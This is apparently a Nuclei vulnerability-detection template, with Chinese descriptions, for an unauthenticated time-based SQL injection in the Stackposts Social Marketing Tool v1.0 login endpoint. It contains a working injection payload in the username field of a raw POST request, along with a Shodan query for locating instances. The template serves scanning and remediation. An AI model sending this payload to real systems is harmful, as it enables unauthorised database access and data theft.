id: stackposts-sqli

info:
  name: Stackposts Social Marketing Tool v1.0 - SQL 注入漏洞
  author: r3Y3r53
  severity: high
  description: |
    该模板用于检测 Stackposts Social Marketing Tool v1.0 - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会根据请求响应中的状态码、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://www.exploit-db.com/exploits/51473
    - https://vulners.com/zdt/1337DAY-ID-38725
    - https://codecanyon.net/item/stackposts-social-marketing-tool/21747459
  classification:
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"stackposts"
  tags: time-based-sqli,sqli,unauth,stackposts,vuln

http:
  - raw:
      - |
        @timeout: 15s
        POST /spre/auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        username=1')AND (SELECT 9595 FROM (SELECT(SLEEP(7)))YRMM) AND ('gaNg'='gaNg&password=test

    matchers:
      - type: dsl
        dsl:
          - 'duration>=7'
          - 'contains(content_type, "text/html")'
          - 'contains(body, "account you entered")'
          - 'status_code == 200'
        condition: and
